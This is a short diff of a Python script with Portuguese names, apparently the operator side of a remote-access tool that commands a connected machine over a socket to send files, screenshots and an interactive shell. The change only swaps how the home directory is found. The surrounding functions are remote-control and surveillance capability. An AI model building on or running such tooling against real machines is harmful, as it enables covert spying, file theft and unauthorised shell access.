@@ -84,8 +84,8 @@ def upload(s, caminho_arquivo=False):
 
 def download(s):
     s.send('3')
-    caminho = os.environ['HOME']+'/Desktop/'
-    caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
+    caminho = os.path.expanduser('~')+'/Desktop/'
+    caminho2 = os.path.expanduser('~')+'/Área\ de\ Trabalho/'
     if(os.path.isdir(caminho)):
         caminho_correto = caminho
     elif(os.path.isdir(caminho2)):
@@ -110,7 +110,7 @@ def download(s):
 def screenshot(s):
     s.send('5')
     nome = s.recv(1024)
-    nome = nome.replace('/tmp/',os.environ['HOME']+'/Desktop/')
+    nome = nome.replace('/tmp/', os.path.expanduser('~')+'/Desktop/')
     f = open(nome , 'wb')
     l = s.recv(1024)
     while(l):
@@ -118,7 +118,7 @@ def screenshot(s):
         l = s.recv(1024)
     f.close()
     print('Screenshot salvo na sua area de trabalho')
-    
+
 def shell(s):
     s.send('2') # shell
     while True:
